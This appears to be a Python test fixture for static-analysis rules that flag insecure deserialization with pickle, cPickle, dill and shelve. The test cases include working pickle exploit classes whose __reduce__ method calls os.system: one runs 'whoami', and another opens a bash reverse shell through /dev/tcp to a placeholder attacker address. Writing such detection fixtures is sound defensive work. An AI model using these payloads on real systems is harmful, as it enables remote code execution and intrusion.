# Import dependencies
import os
import _pickle

# Attacker prepares exploit that application will insecurely deserialize
class Exploit(object):
  def __reduce__(self):
    return (os.system, ('whoami',))

# Attacker serializes the exploit
def serialize_exploit():
  # ruleid: avoid-pickle
  shellcode = _pickle.dumps(Exploit())
  return shellcode

# Application insecurely deserializes the attacker's serialized data
def insecure_deserialization(exploit_code):
  # ok 
  # _pickle.loads(exploit_code)
  
  # ruleid: avoid-pickle
  _pickle.loads(exploit_code)

# Application insecurely deserializes the attacker's serialized data
def insecure_deserialization_2(exploit_code):
  import _pickle as adaasfa
  # ruleid: avoid-pickle
  adaasfa.loads(exploit_code)

import cPickle
import socket

class Shell_code(object):
  def __reduce__(self):
          return (os.system,('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))
# ruleid: avoid-cPickle
shell = cPickle.dumps(Shell_code())

import dill
# ruleid: avoid-dill
shell = dill.dumps(Shell_code())

import shelve
# ruleid: avoid-shelve
myShelve = shelve.open(Shell_code())

if __name__ == '__main__':
  # Serialize the exploit
  shellcode = serialize_exploit()

  # Attacker's payload runs a `whoami` command
  insecure_deserialization(shellcode)